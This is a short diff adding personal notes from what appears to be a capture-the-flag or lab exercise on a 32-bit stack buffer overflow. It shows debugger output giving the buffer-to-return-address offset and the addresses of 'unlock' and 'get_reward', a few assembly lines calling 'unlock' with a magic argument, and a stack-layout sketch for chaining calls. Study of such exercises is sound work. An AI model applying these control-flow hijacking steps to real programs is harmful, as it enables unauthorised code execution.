@@ -1,0 +1,30 @@
+gef➤  p/d (void *)$ebp + 4 - (void *)&buffer
+$1 = 98
+gef➤  p unlock
+$2 = {void (int)} 0x5655628d <unlock>
+gef➤  p get_reward
+$3 = {void ()} 0x565562fb <get_reward>
+
+unlock at ebp+4
+
+
+
+shell-concept: (was not acceptable as proper sln, but also a way)
+mov ebx, 0x5655628d
+mov eax, 0xA5A50020
+
+push eax
+call ebx
+
+mov ebx, 0x565562f6
+call ebx
+
+
+main-concept:
+
+param -> ebp+ 12
+return -> ebp+8 (of the function I am calling)
+return -> ebp+4 (of mine)
+ebp
+buffer
+
